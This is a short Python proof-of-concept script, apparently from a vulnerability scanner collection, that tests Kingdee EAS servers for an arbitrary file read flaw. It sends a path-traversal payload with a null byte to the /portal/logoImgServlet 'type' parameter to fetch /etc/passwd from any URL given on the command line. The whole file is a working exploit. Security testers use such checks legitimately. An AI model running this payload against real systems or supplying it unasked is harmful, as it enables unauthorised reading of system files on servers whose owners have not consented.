#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶EAS任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2015-096179
author: Lucifer
description: 文件/portal/logoImgServlet中,参数type未过滤存在任意文件读取。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/portal/logoImgServlet?language=ch&dataCenter=&insId=insId&type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
